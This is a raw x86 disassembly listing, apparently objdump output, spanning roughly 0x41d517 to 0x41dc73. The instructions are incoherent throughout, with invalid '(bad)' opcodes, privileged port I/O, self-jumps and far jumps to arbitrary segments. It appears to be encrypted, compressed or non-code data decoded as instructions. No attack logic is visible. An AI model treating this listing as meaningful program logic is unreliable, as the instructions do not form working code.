  41d517:	aad    0xdf
  41d519:	mov    al,0x82
  41d51b:	mov    bl,0x8b
  41d51d:	or     al,0x79
  41d51f:	jo     0x41d56e
  41d521:	(bad)  
  41d522:	dec    ebx
  41d524:	push   ss
  41d525:	and    al,0x92
  41d527:	leave  
  41d528:	clc    
  41d529:	out    dx,eax
  41d52a:	jno    0x41d4cf
  41d52c:	ja     0x41d4c9
  41d52e:	add    ebp,DWORD PTR [ebx+0x66db42c]
  41d534:	into   
  41d535:	xchg   BYTE PTR [ebp-0x69052b63],ah
  41d53b:	mov    esi,0x9c070bed
  41d540:	inc    esi
  41d541:	outs   dx,DWORD PTR ds:[esi]
  41d542:	jb     0x41d53d
  41d544:	push   ss
  41d545:	nop
  41d546:	pop    ds
  41d547:	jb     0x41d561
  41d549:	and    al,0x5e
  41d54b:	int3   
  41d54c:	dec    ebp
  41d54d:	sub    DWORD PTR [eax],esi
  41d54f:	in     eax,dx
  41d550:	pusha  
  41d551:	xchg   edi,eax
  41d552:	repz out dx,al
  41d554:	call   0x28a15d55
  41d559:	or     al,0x8b
  41d55b:	ret    0x5f48
  41d55e:	sub    edi,DWORD PTR [edx+0x7a07cadb]
  41d564:	aad    0x42
  41d566:	jb     0x41d5dc
  41d568:	xlat   BYTE PTR ds:[ebx]
  41d569:	mov    ds:0x75c00f00,eax
  41d56e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d56f:	mov    WORD PTR [ebp+0x2cb1d44c],gs
  41d575:	mov    bl,0x6d
  41d577:	int3   
  41d578:	dec    esp
  41d579:	fldenv [eax-0x7915e323]
  41d57f:	ficom  WORD PTR [ecx+eax*8]
  41d582:	adc    eax,0xb0df6783
  41d587:	jne    0x41d5ab
  41d589:	ins    BYTE PTR es:[edi],dx
  41d58a:	test   eax,0x9845c8b8
  41d58f:	push   eax
  41d590:	not    DWORD PTR [ebp-0x2]
  41d593:	repz xor DWORD PTR fs:[edx-0x71],esp
  41d598:	push   esi
  41d599:	adc    ebp,DWORD PTR [eax]
  41d59b:	outs   dx,BYTE PTR ds:[esi]
  41d59c:	enter  0x12ab,0xba
  41d5a0:	bound  edx,QWORD PTR [esi]
  41d5a2:	pop    eax
  41d5a3:	cmc    
  41d5a4:	enter  0x1ebb,0xa1
  41d5a8:	in     al,0x62
  41d5aa:	push   es
  41d5ab:	test   al,0x9d
  41d5ad:	pushf  
  41d5ae:	pop    eax
  41d5af:	jo     0x41d53f
  41d5b1:	sbb    BYTE PTR [edi+eax*8-0x7b],cl
  41d5b5:	out    dx,al
  41d5b6:	call   0x3b32:0x31055878
  41d5bd:	sub    al,0x3d
  41d5bf:	push   esi
  41d5c0:	pop    es
  41d5c1:	push   esi
  41d5c2:	dec    edi
  41d5c3:	aas    
  41d5c4:	ins    DWORD PTR es:[di],dx
  41d5c6:	inc    edx
  41d5c7:	fwait
  41d5c8:	sbb    BYTE PTR [edx-0x6],dl
  41d5cb:	jle    0x41d621
  41d5cd:	inc    ecx
  41d5ce:	sbb    BYTE PTR [edx-0x7eb5553],0xfe
  41d5d5:	popf   
  41d5d6:	mov    edx,0x7ad4d741
  41d5db:	jmp    0xe055:0xd1d46bc1
  41d5e2:	loope  0x41d618
  41d5e4:	jae    0x41d5e6
  41d5e6:	jns    0x41d57e
  41d5e8:	loope  0x41d595
  41d5ea:	fst    DWORD PTR [ecx-0x777c3578]
  41d5f0:	sahf   
  41d5f1:	shl    BYTE PTR [esp+ebp*8-0xc],cl
  41d5f5:	fxch   st(5)
  41d5f7:	pop    edi
  41d5f8:	(bad)  
  41d5fa:	mov    edx,0xed2c7a93
  41d5ff:	inc    ebp
  41d600:	mov    dh,0x63
  41d602:	mov    esi,0xa7dbf080
  41d607:	enter  0x3417,0x65
  41d60b:	and    al,0x9d
  41d60d:	xlat   BYTE PTR ds:[ebx]
  41d60e:	pop    ebx
  41d60f:	and    DWORD PTR ds:0x62627f38,ecx
  41d615:	sbb    dh,ah
  41d617:	daa    
  41d618:	adc    esi,DWORD PTR ds:0xc43bd550
  41d61e:	clc    
  41d61f:	fdiv   QWORD PTR ds:0x99a0edb2
  41d625:	dec    ebp
  41d626:	mov    bh,0xaf
  41d628:	dec    eax
  41d629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d62a:	hlt    
  41d62b:	cmp    BYTE PTR [ecx-0x3693238d],ah
  41d631:	or     BYTE PTR [ecx+0x7af71323],0x5c
  41d638:	nop
  41d639:	fstp   QWORD PTR es:[ebp-0x1]
  41d63d:	retf   
  41d63e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d63f:	add    al,0x7e
  41d641:	test   BYTE PTR cs:[ebx+0x6d],dh
  41d645:	jnp    0x41d611
  41d647:	test   BYTE PTR [esp+eiz*4-0x45],ch
  41d64b:	mov    esi,0xb459144b
  41d650:	dec    esi
  41d651:	lods   al,BYTE PTR ds:[esi]
  41d652:	imul   ebp,DWORD PTR [esi],0x67b2b352
  41d658:	repnz xor BYTE PTR [edi-0x79],dl
  41d65c:	pop    ebp
  41d65d:	mov    edx,0x6a2f60f1
  41d662:	ret    
  41d663:	add    al,0xc0
  41d665:	xlat   BYTE PTR ds:[ebx]
  41d666:	xchg   edi,eax
  41d667:	std    
  41d668:	fisub  WORD PTR [ecx+ebx*1+0xa431c0]
  41d66f:	push   ebp
  41d670:	mov    ch,0xbc
  41d672:	mov    dl,0x4e
  41d674:	ss add al,0xe5
  41d677:	inc    ebp
  41d678:	mov    ebp,ss
  41d67a:	xchg   ebp,ecx
  41d67c:	ss retf 0x73da
  41d680:	push   esi
  41d681:	push   edx
  41d682:	stos   BYTE PTR es:[edi],al
  41d683:	inc    ebp
  41d684:	(bad)  
  41d685:	(bad)  
  41d686:	stos   DWORD PTR es:[edi],eax
  41d687:	(bad)  
  41d688:	sti    
  41d689:	stos   BYTE PTR es:[edi],al
  41d68a:	fisttp DWORD PTR [ebx-0x68]
  41d68d:	sub    al,cl
  41d68f:	rcl    al,1
  41d691:	xchg   ecx,eax
  41d692:	and    ebp,DWORD PTR [ebp+eiz*2-0x24a6701a]
  41d699:	adc    eax,0x59ef7919
  41d69e:	jae    0x41d6e2
  41d6a0:	push   ecx
  41d6a1:	or     al,0xac
  41d6a3:	xchg   edi,eax
  41d6a4:	jmp    DWORD PTR [edx+ecx*1-0x72c8abf2]
  41d6ab:	dec    eax
  41d6ac:	lea    edx,[edi]
  41d6ae:	push   esp
  41d6af:	mov    ds:0x1d3571,eax
  41d6b4:	adc    bh,BYTE PTR [edx-0x19073928]
  41d6ba:	push   ds
  41d6bb:	(bad)  
  41d6bc:	adc    bl,dh
  41d6be:	cwde   
  41d6bf:	out    dx,al
  41d6c0:	or     eax,esp
  41d6c2:	js     0x41d644
  41d6c4:	push   eax
  41d6c5:	out    dx,al
  41d6c6:	add    DWORD PTR [eax],eax
  41d6c8:	out    0x1,eax
  41d6ca:	add    BYTE PTR [eax],al
  41d6cc:	in     eax,0xd3
  41d6ce:	adc    DWORD PTR [ecx],ecx
  41d6d0:	jecxz  0x41d724
  41d6d2:	pop    ecx
  41d6d3:	nop
  41d6d4:	paddb  mm3,QWORD PTR [edi+0x59]
  41d6d8:	out    dx,al
  41d6d9:	pop    eax
  41d6da:	mov    al,0x43
  41d6dc:	ja     0x41d733
  41d6de:	std    
  41d6df:	or     BYTE PTR [ebx],0x8c
  41d6e2:	pop    esp
  41d6e3:	inc    esi
  41d6e4:	dec    edi
  41d6e5:	repz cmp DWORD PTR ds:0x3e2d0c25,0xffffffe2
  41d6ed:	dec    esi
  41d6ee:	mov    ds:0x5ef6088c,eax
  41d6f3:	mov    edi,0x770e68ab
  41d6f8:	mov    dh,0x4f
  41d6fa:	cmp    DWORD PTR [ebx],ebx
  41d6fc:	adc    DWORD PTR [ebx+0x7c2d3f4c],0xffffff83
  41d703:	pusha  
  41d704:	loopne 0x41d780
  41d706:	push   ebp
  41d707:	cld    
  41d708:	dec    ebx
  41d709:	pop    ss
  41d70a:	fist   WORD PTR [edx]
  41d70c:	je     0x41d6b5
  41d70e:	adc    eax,0x66d8559f
  41d713:	bound  esp,QWORD PTR [ecx+0x68]
  41d716:	xchg   ecx,eax
  41d717:	ins    BYTE PTR es:[edi],dx
  41d718:	in     eax,dx
  41d719:	and    DWORD PTR [edi+0x5d],ebp
  41d71c:	xchg   DWORD PTR [ebx-0x1a],esp
  41d71f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d720:	sub    DWORD PTR [ebp-0x7b],edx
  41d723:	enter  0xe323,0x7d
  41d727:	aaa    
  41d728:	leave  
  41d729:	clc    
  41d72a:	test   BYTE PTR [ecx-0x7f],0xbc
  41d72e:	push   es
  41d72f:	in     eax,0x2a
  41d731:	stc    
  41d732:	jbe    0x41d778
  41d734:	lahf   
  41d735:	repz and bx,si
  41d739:	dec    ebx
  41d73a:	stos   BYTE PTR es:[edi],al
  41d73b:	fsub   DWORD PTR [eax-0x4026d968]
  41d741:	jg     0x41d774
  41d743:	rol    BYTE PTR [esp+ebx*2+0x1514b5c6],0x87
  41d74b:	sub    ch,bl
  41d74d:	paddd  mm2,QWORD PTR [eax+ecx*8+0x41]
  41d752:	mov    al,ds:0xe2f96ee
  41d757:	sub    BYTE PTR [ebx+0x7f],cl
  41d75a:	add    BYTE PTR [ebp-0x4a3df317],ah
  41d760:	iret   
  41d761:	ror    DWORD PTR [edi-0x4e],1
  41d764:	mov    eax,ds:0xe219ffbd
  41d769:	push   0xfffffff7
  41d76b:	mov    dl,cl
  41d76d:	jmp    0x4655:0xcb840293
  41d774:	sar    DWORD PTR [ecx-0x17],1
  41d777:	fist   WORD PTR [edx+0x596cec2d]
  41d77d:	jb     0x41d77d
  41d77f:	ds das 
  41d781:	sub    eax,0x45f2b408
  41d786:	jmp    0x41d7cb
  41d788:	dec    ebx
  41d789:	imul   ebp,DWORD PTR [edi+0x17807679],0xbfc98b8d
  41d793:	sbb    al,0xf6
  41d795:	jl     0x41d7a5
  41d797:	mov    al,ds:0x6efeb834
  41d79c:	dec    ebp
  41d79d:	pop    edx
  41d79e:	dec    edi
  41d79f:	sbb    eax,0x9c8631d4
  41d7a4:	mov    gs,WORD PTR [ebx+0x50]
  41d7a7:	or     edx,0x1458bd20
  41d7ad:	enter  0xd7cb,0x26
  41d7b1:	mov    eax,ds:0xf7827e49
  41d7b6:	add    BYTE PTR [eax],bl
  41d7b8:	xchg   ecx,eax
  41d7b9:	out    0x64,al
  41d7bb:	mov    esi,0x7947bc1a
  41d7c0:	cmp    dh,ch
  41d7c2:	adc    al,0x26
  41d7c4:	pop    ecx
  41d7c5:	cdq    
  41d7c6:	sbb    al,0xdd
  41d7c8:	push   ebp
  41d7c9:	sbb    dl,BYTE PTR [edx]
  41d7cb:	jo     0x41d791
  41d7cd:	push   ebx
  41d7ce:	les    ecx,FWORD PTR [edi-0x172bbb22]
  41d7d4:	xchg   bl,bl
  41d7d6:	pop    ebx
  41d7d7:	pop    edx
  41d7d8:	into   
  41d7d9:	lea    esi,[edx]
  41d7db:	xor    BYTE PTR [ebx+0x61],ch
  41d7de:	(bad)  
  41d7df:	ss or  al,0x46
  41d7e2:	dec    esp
  41d7e3:	out    0x31,al
  41d7e5:	rcl    al,0xdd
  41d7e8:	lods   eax,DWORD PTR ds:[esi]
  41d7e9:	sbb    ah,bh
  41d7eb:	(bad)  
  41d7ec:	or     al,BYTE PTR [edi+0x4]
  41d7ef:	retf   
  41d7f0:	sub    DWORD PTR [eax],esp
  41d7f2:	add    al,0x9a
  41d7f4:	(bad)  
  41d7f5:	adc    DWORD PTR [ecx-0x597fc9f6],eax
  41d7fb:	aaa    
  41d7fc:	cmp    DWORD PTR [eax+0x33f42dab],esi
  41d802:	and    BYTE PTR gs:[esi+0x97a97da],ah
  41d809:	mov    al,BYTE PTR [esi+esi*4]
  41d80c:	clc    
  41d80d:	add    DWORD PTR [edx],esi
  41d80f:	cdq    
  41d810:	xchg   DWORD PTR [ebx],eax
  41d812:	not    BYTE PTR [edi+0x3d]
  41d815:	loopne 0x41d852
  41d817:	push   edx
  41d818:	jecxz  0x41d879
  41d81a:	inc    esi
  41d81b:	push   cs
  41d81c:	xchg   ebx,eax
  41d81d:	in     al,dx
  41d81e:	jnp    0x41d848
  41d820:	fcom   QWORD PTR [edi-0x49]
  41d823:	jbe    0x41d877
  41d825:	in     eax,0xc8
  41d827:	mov    ecx,0x924ed91a
  41d82c:	ret    
  41d82d:	xor    eax,0x8b16d4d8
  41d832:	dec    eax
  41d833:	shr    edi,0x4f
  41d836:	cmp    eax,DWORD PTR [ebp-0x63]
  41d839:	adc    DWORD PTR [eax+0x22ac3b32],ecx
  41d83f:	or     al,0xbe
  41d841:	and    dl,0xea
  41d844:	dec    ecx
  41d845:	js     0x41d7d2
  41d847:	repnz pop ebx
  41d849:	push   ebx
  41d84a:	mov    al,0xc7
  41d84c:	cmp    DWORD PTR [edi+eax*8],esi
  41d84f:	pop    ecx
  41d850:	mov    DWORD PTR [ebp-0x6e],esp
  41d853:	cs xchg ebp,eax
  41d855:	mov    al,0xa4
  41d857:	mov    esp,0x9c231c8e
  41d85c:	jge    0x41d86b
  41d85e:	popf   
  41d85f:	adc    DWORD PTR [edi-0x1b],eax
  41d862:	ds mov bl,0x62
  41d865:	xchg   edx,eax
  41d866:	jecxz  0x41d8a2
  41d868:	xor    eax,0xd36306c3
  41d86e:	mov    ecx,0xcb094d82
  41d873:	sub    DWORD PTR [esi-0x4ad3e89e],ebp
  41d879:	in     al,0x2c
  41d87b:	sti    
  41d87c:	leave  
  41d87d:	push   edx
  41d87e:	xchg   esp,eax
  41d87f:	pop    ecx
  41d880:	mov    ah,0xff
  41d882:	outs   dx,BYTE PTR ds:[esi]
  41d883:	je     0x41d8f0
  41d885:	call   ecx
  41d887:	test   eax,0xf3188452
  41d88c:	lahf   
  41d88d:	ficom  WORD PTR [esi+0x38]
  41d890:	xlat   BYTE PTR ds:[ebx]
  41d891:	push   0xffffff8d
  41d893:	pop    ebx
  41d894:	fistp  DWORD PTR [eax+0x74ee1a90]
  41d89a:	fnstcw WORD PTR [edi]
  41d89c:	cmp    bh,BYTE PTR [ecx]
  41d89e:	mov    ds:0xa47efbdc,eax
  41d8a3:	std    
  41d8a4:	imul   eax,DWORD PTR [bx+di-0x67],0xb
  41d8a9:	xchg   esp,eax
  41d8aa:	call   0x1c93:0xb89b338a
  41d8b1:	outs   dx,BYTE PTR ds:[esi]
  41d8b2:	jmp    0x2f30:0x28464900
  41d8b9:	jle    0x41d914
  41d8bb:	jg     0x41d883
  41d8bd:	imul   esi,eax,0xffffffd5
  41d8c0:	push   0x3787410f
  41d8c5:	lock add DWORD PTR [eax],eax
  41d8c8:	out    0x1,eax
  41d8ca:	add    BYTE PTR [eax],al
  41d8cc:	sub    al,0xf1
  41d8ce:	pop    ds
  41d8cf:	fld    TBYTE PTR [ebp-0xd]
  41d8d2:	pop    ebp
  41d8d3:	cs xchg edi,eax
  41d8d5:	retf   0xe7e5
  41d8d8:	adc    al,0x21
  41d8da:	jns    0x41d8c8
  41d8dc:	pushf  
  41d8dd:	mov    esp,DWORD PTR [edx+ebx*1-0x7de6a631]
  41d8e4:	inc    esp
  41d8e5:	mov    dl,BYTE PTR [esi]
  41d8e7:	in     eax,0xc9
  41d8e9:	push   edi
  41d8ea:	(bad)  
  41d8eb:	cmp    BYTE PTR [ebx-0x40105ddf],dh
  41d8f1:	sbb    eax,0x70cf9f80
  41d8f6:	iret   
  41d8f7:	ficom  DWORD PTR [eax-0x5fa4ce2a]
  41d8fd:	adc    BYTE PTR [eax],bh
  41d8ff:	push   esp
  41d900:	push   edi
  41d901:	dec    ecx
  41d902:	mov    esi,0xf91f6ea6
  41d907:	inc    ecx
  41d908:	add    esi,DWORD PTR [ebp-0x7a0e8238]
  41d90e:	or     DWORD PTR [ecx-0xa],0x49
  41d912:	pusha  
  41d913:	jb     0x41d927
  41d915:	push   eax
  41d916:	add    eax,0x32f5d7d1
  41d91b:	xor    eax,0x3532980b
  41d920:	jb     0x41d8d9
  41d922:	sbb    bl,BYTE PTR [ecx+0x2a]
  41d925:	jle    0x41d974
  41d927:	dec    esp
  41d928:	and    al,0xe7
  41d92a:	jae    0x41d966
  41d92c:	mov    ds:0x5df7d6d4,eax
  41d931:	cli    
  41d932:	sti    
  41d933:	xor    DWORD PTR [edi-0x207cfa42],0xffffffc1
  41d93a:	sub    esp,DWORD PTR [ebp+0x62952415]
  41d940:	xchg   edi,eax
  41d941:	add    eax,DWORD PTR [eax]
  41d943:	mov    bl,0xbc
  41d945:	dec    eax
  41d946:	sub    al,0xb2
  41d948:	jne    0x41d995
  41d94a:	cwde   
  41d94b:	push   ss
  41d94c:	jge    0x41d91d
  41d94e:	xor    DWORD PTR [edx+esi*1],esp
  41d951:	push   0x51
  41d953:	nop
  41d954:	adc    al,0x15
  41d956:	dec    edx
  41d957:	or     cl,BYTE PTR [ebx]
  41d959:	in     al,dx
  41d95a:	ss xor ebp,edx
  41d95d:	sahf   
  41d95e:	inc    ebp
  41d95f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d960:	je     0x41d963
  41d962:	inc    esp
  41d963:	inc    esi
  41d964:	mov    al,0x5d
  41d966:	cmp    eax,0x7cc1925e
  41d96b:	xchg   BYTE PTR [ecx],dh
  41d96d:	add    ah,BYTE PTR [ebp+0x69]
  41d970:	jo     0x41d963
  41d972:	cmp    BYTE PTR [ecx*8+0x17ec44e1],0x99
  41d97a:	xchg   esp,eax
  41d97b:	(bad)  
  41d97c:	xchg   edx,eax
  41d97d:	stos   BYTE PTR es:[edi],al
  41d97e:	jge    0x41d9fe
  41d980:	enter  0x3f83,0x90
  41d984:	and    ebp,DWORD PTR [esi]
  41d986:	jo     0x41d9b5
  41d988:	pop    ecx
  41d989:	lock add edi,esi
  41d98c:	xchg   BYTE PTR [edi],dl
  41d98e:	jmp    DWORD PTR [ecx+0x77]
  41d991:	stos   DWORD PTR es:[edi],eax
  41d992:	jle    0x41d966
  41d994:	push   ebx
  41d995:	repnz test eax,0x9445ba02
  41d99b:	dec    esp
  41d99c:	outs   dx,BYTE PTR ds:[esi]
  41d99d:	sub    al,0x76
  41d99f:	retf   
  41d9a0:	fist   WORD PTR [esp+ebx*4+0x4e]
  41d9a4:	and    al,0x68
  41d9a6:	inc    esi
  41d9a7:	(bad)
  41d9aa:	sti    
  41d9ab:	popa   
  41d9ac:	test   eax,0x5cb90aa0
  41d9b1:	cmp    bh,0x3d
  41d9b4:	pop    ebx
  41d9b5:	and    esp,0xfdcc6b90
  41d9bb:	into   
  41d9bc:	jns    0x41d9ec
  41d9be:	pusha  
  41d9bf:	sahf   
  41d9c0:	loop   0x41d9cf
  41d9c2:	std    
  41d9c3:	stos   DWORD PTR es:[edi],eax
  41d9c4:	and    ebp,eax
  41d9c6:	cwde   
  41d9c7:	jmp    0x41da2e
  41d9c9:	jle    0x41d9cc
  41d9cb:	sbb    eax,0xa490834e
  41d9d0:	dec    edi
  41d9d1:	or     DWORD PTR [eax+0x67a33244],ecx
  41d9d7:	inc    eax
  41d9d8:	mov    esp,0x132a56cb
  41d9dd:	jae    0x41da04
  41d9df:	das    
  41d9e0:	lods   eax,DWORD PTR ds:[esi]
  41d9e1:	sbb    ebp,ebp
  41d9e3:	sbb    bl,bl
  41d9e5:	xlat   BYTE PTR ds:[bx]
  41d9e7:	shl    BYTE PTR [edx-0x76387e8c],cl
  41d9ed:	or     BYTE PTR [edx],0x96
  41d9f0:	pop    ss
  41d9f1:	arpl   WORD PTR [edx-0x50],si
  41d9f4:	sti    
  41d9f5:	push   es
  41d9f6:	cli    
  41d9f7:	inc    ebx
  41d9f8:	or     eax,0x63333eab
  41d9fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9fe:	sar    edx,1
  41da00:	mov    fs,WORD PTR [ebx-0x3dd3e6a4]
  41da06:	stos   DWORD PTR es:[edi],eax
  41da07:	call   0xf29065e9
  41da0c:	adc    eax,ebp
  41da0e:	aaa    
  41da0f:	sbb    ecx,ebp
  41da11:	pop    esp
  41da12:	mov    dh,0x4
  41da14:	les    edx,FWORD PTR [eax+ebp*4+0x2f]
  41da18:	mov    esi,0x2e099e9
  41da1d:	addr16 aad 0x87
  41da20:	(bad)  
  41da21:	(bad)  
  41da22:	jae    0x41daa2
  41da24:	outs   dx,BYTE PTR ds:[esi]
  41da25:	mov    ds:0x41b1d2c8,eax
  41da2a:	cmp    al,0x4d
  41da2c:	loope  0x41d9f0
  41da2e:	ja     0x41da80
  41da30:	mov    edx,0xfa4ee065
  41da35:	outs   dx,BYTE PTR ds:[esi]
  41da36:	mov    ds:0xf812b0eb,al
  41da3b:	fwait
  41da3c:	push   edx
  41da3d:	mov    dh,0xd3
  41da3f:	add    al,dh
  41da41:	pushf  
  41da42:	push   eax
  41da43:	adc    dh,BYTE PTR [esp+ecx*2+0x42]
  41da47:	push   ebp
  41da48:	retf   
  41da49:	ja     0x41da09
  41da4b:	fcom   DWORD PTR [edx+0x25]
  41da4e:	add    dh,dl
  41da50:	shr    al,1
  41da52:	arpl   di,si
  41da54:	sahf   
  41da55:	mov    esp,0xc84f7b36
  41da5a:	xor    eax,0x756656f7
  41da5f:	jl     0x41da21
  41da61:	xchg   esp,eax
  41da62:	xchg   DWORD PTR [eax],eax
  41da64:	inc    esp
  41da65:	loopne 0x41daae
  41da67:	mov    ?,WORD PTR [ebx-0x241eb033]
  41da6d:	or     eax,DWORD PTR [ebx]
  41da6f:	test   eax,0x4cdc21c7
  41da74:	and    BYTE PTR [ebx+0x64],ah
  41da77:	out    dx,eax
  41da78:	loop   0x41da49
  41da7a:	int3   
  41da7b:	add    bh,dl
  41da7d:	je     0x41dad7
  41da7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da80:	punpckhdq mm4,QWORD PTR [edx+esi*2-0x52]
  41da85:	and    BYTE PTR ds:0xac3f641f,ch
  41da8b:	xor    BYTE PTR gs:[ebp-0x68],bh
  41da8f:	xor    al,BYTE PTR [esi]
  41da91:	loope  0x41da88
  41da93:	(bad)  
  41da94:	xchg   edi,eax
  41da95:	mov    edx,0x62258d3d
  41da9a:	push   eax
  41da9b:	in     al,dx
  41da9c:	fld    DWORD PTR [esi-0x72]
  41da9f:	sbb    eax,0x4cb753a4
  41daa4:	cmp    al,0xf
  41daa6:	jae    0x41dac2
  41daa8:	fsub   QWORD PTR [ebx]
  41daaa:	in     eax,dx
  41daab:	jle    0x41da6a
  41daad:	test   eax,0x48c7137
  41dab2:	nop
  41dab3:	add    BYTE PTR [edi-0x3a],ah
  41dab6:	and    dh,dh
  41dab8:	mov    eax,ds:0xe7d7f7f6
  41dabd:	mov    eax,0xa83eda72
  41dac2:	fbstp  TBYTE PTR [esi+ebx*1-0x18fffe0e]
  41dac9:	add    DWORD PTR [eax],eax
  41dacb:	add    BYTE PTR [edx],dl
  41dacd:	dec    esp
  41dace:	imul   eax,DWORD PTR [ecx+0x2b],0xffffffbf
  41dad2:	mov    cl,0xad
  41dad4:	jae    0x41da6d
  41dad6:	push   esp
  41dad7:	mov    al,0x1a
  41dad9:	cmp    ch,cl
  41dadb:	sub    eax,0xc4a663bd
  41dae0:	(bad)  
  41dae2:	dec    eax
  41dae3:	mov    ebx,0xc30e4ee6
  41dae8:	cmp    ecx,DWORD PTR [edi-0x580aa7d6]
  41daee:	pop    edx
  41daef:	mov    ebp,0xac4f88d1
  41daf4:	sbb    edx,edx
  41daf6:	mov    esp,0x5bcb5fa9
  41dafb:	or     ah,cl
  41dafd:	icebp  
  41dafe:	jae    0x41daea
  41db00:	mov    al,ds:0x53993a8a
  41db05:	cmp    edi,eax
  41db07:	sbb    al,0x70
  41db09:	lods   al,BYTE PTR ds:[esi]
  41db0a:	inc    ebp
  41db0b:	adc    BYTE PTR [ecx],dh
  41db0d:	call   0x10f8:0x9e849787
  41db14:	or     esp,DWORD PTR [ebx+esi*2+0x26d21e0]
  41db1b:	pusha  
  41db1c:	add    dh,ah
  41db1e:	repnz rol BYTE PTR [eax],0xee
  41db22:	leave  
  41db23:	pop    ecx
  41db24:	mov    bh,0x49
  41db26:	mov    es,edi
  41db28:	ins    BYTE PTR es:[edi],dx
  41db29:	mov    al,ds:0x79dcc36c
  41db2e:	shufps xmm3,XMMWORD PTR [ecx+eax*1-0x3b2f45ac],0x7e
  41db37:	hlt    
  41db38:	aaa    
  41db39:	adc    eax,0xc223c34d
  41db3e:	or     al,0x6
  41db40:	adc    al,0x8f
  41db42:	sbb    al,0xc2
  41db44:	(bad)  
  41db45:	clc    
  41db46:	repz fstp st(7)
  41db49:	xor    eax,0x60ec5c88
  41db4e:	out    dx,al
  41db4f:	pushf  
  41db50:	shr    bh,1
  41db52:	je     0x41db04
  41db54:	jo     0x41dbac
  41db56:	loope  0x41db11
  41db58:	inc    eax
  41db59:	jno    0x41dba8
  41db5b:	push   edi
  41db5c:	inc    esp
  41db5d:	jns    0x41db81
  41db5f:	xor    DWORD PTR [esi],ebx
  41db61:	mov    cl,0x59
  41db63:	sbb    BYTE PTR [ebp+0x2e],0x40
  41db67:	push   ecx
  41db68:	test   DWORD PTR [eax],edx
  41db6a:	cmp    dh,BYTE PTR [ecx+0x258a9f9b]
  41db70:	push   ebp
  41db71:	jae    0x41db7c
  41db73:	ret    0xf00c
  41db76:	and    BYTE PTR [eax-0x49],bh
  41db79:	xchg   edx,eax
  41db7a:	and    ecx,ecx
  41db7c:	jge    0x41dbc5
  41db7e:	pop    eax
  41db7f:	mov    bh,0x6e
  41db81:	jbe    0x41dbed
  41db83:	gs dec ebx
  41db85:	(bad)  
  41db86:	fiadd  WORD PTR [edi]
  41db88:	fprem1 
  41db8a:	cld    
  41db8b:	je     0x41dbdd
  41db8d:	push   esi
  41db8e:	les    ebx,FWORD PTR [ecx+ebx*2+0x51]
  41db92:	fidivr WORD PTR [esi-0x4b]
  41db95:	sbb    dh,al
  41db97:	pop    ds
  41db98:	loopne 0x41dbea
  41db9a:	call   0x6f58:0x36c70dac
  41dba1:	mov    ah,0xd7
  41dba3:	jns    0x41db8d
  41dba5:	icebp  
  41dba6:	sub    ch,BYTE PTR [ebx+eax*2-0x1d]
  41dbaa:	push   0xfffffff4
  41dbac:	addr16 pop ss
  41dbae:	rcl    BYTE PTR [ebx+edi*4+0x3a1dda2],cl
  41dbb5:	iret   
  41dbb6:	out    0x90,eax
  41dbb8:	adc    dh,ah
  41dbba:	lods   eax,DWORD PTR ds:[esi]
  41dbbb:	mov    ebx,0x84c58431
  41dbc0:	mov    ebx,0x6ec37519
  41dbc5:	xchg   ebx,eax
  41dbc6:	jp     0x41dbb5
  41dbc8:	ror    BYTE PTR cs:[edi],cl
  41dbcb:	sub    BYTE PTR [ebx],0xda
  41dbce:	xchg   ebp,eax
  41dbcf:	lea    edi,[edx]
  41dbd1:	inc    ebp
  41dbd2:	cs fsubr st,st(5)
  41dbd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbd6:	push   0xffffff9f
  41dbd8:	sahf   
  41dbd9:	inc    eax
  41dbda:	cmp    eax,0x77d9c0a1
  41dbdf:	adc    DWORD PTR [eax-0x5a],ebp
  41dbe2:	adc    BYTE PTR [eax],al
  41dbe4:	cmp    eax,0xa3ad7b1
  41dbe9:	arpl   WORD PTR [ecx],ax
  41dbeb:	clc    
  41dbec:	fwait
  41dbed:	int3   
  41dbee:	shl    BYTE PTR [edi],1
  41dbf0:	sbb    ah,BYTE PTR [ebx]
  41dbf2:	fidiv  WORD PTR [eax+edi*2]
  41dbf5:	leave  
  41dbf6:	fisttp QWORD PTR [edx+0x13]
  41dbf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbfa:	shr    DWORD PTR [esi+0x15f58dff],cl
  41dc00:	jmp    0xf0e:0xd50fc838
  41dc07:	sbb    ecx,DWORD PTR [eax+0x47a8abb9]
  41dc0d:	loopne 0x41dbfe
  41dc0f:	adc    al,0x6b
  41dc11:	pop    ecx
  41dc12:	xchg   ecx,eax
  41dc13:	jecxz  0x41dc8a
  41dc15:	iret   
  41dc16:	xchg   esp,eax
  41dc17:	test   BYTE PTR [edi+0x5090362f],bh
  41dc1d:	mov    esp,0xe1ad6701
  41dc22:	ds dec ecx
  41dc24:	retf   0x4c4
  41dc27:	inc    ecx
  41dc28:	pmuludq mm3,QWORD PTR [ebp+0x2a62161f]
  41dc2f:	shr    DWORD PTR [esi],1
  41dc31:	mov    ebx,0x5903fa6a
  41dc36:	pushf  
  41dc37:	retf   0x7da8
  41dc3a:	pop    edx
  41dc3b:	aaa    
  41dc3c:	push   ebx
  41dc3d:	ss jmp 0x41dc58
  41dc40:	pop    DWORD PTR [edi]
  41dc42:	and    dh,dh
  41dc44:	(bad)  
  41dc46:	je     0x41dbd1
  41dc48:	push   ebx
  41dc49:	in     al,0x58
  41dc4b:	inc    eax
  41dc4c:	xor    al,0xf7
  41dc4f:	sti    
  41dc50:	pushf  
  41dc51:	inc    ecx
  41dc52:	ror    DWORD PTR [edi],1
  41dc54:	loope  0x41dc30
  41dc56:	xor    ebp,edi
  41dc58:	(bad)  
  41dc59:	fistp  QWORD PTR [edi]
  41dc5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc5c:	dec    ecx
  41dc5d:	jbe    0x41dc3f
  41dc5f:	fcom   DWORD PTR [ecx+0x5d]
  41dc62:	dec    edi
  41dc63:	faddp  st(1),st
  41dc65:	in     al,0x35
  41dc67:	jns    0x41dbea
  41dc69:	shl    DWORD PTR [esi-0x7d919120],0x7c
  41dc70:	mov    edi,ebp
  41dc72:	push   esi
  41dc73:	xchg   ebx,eax
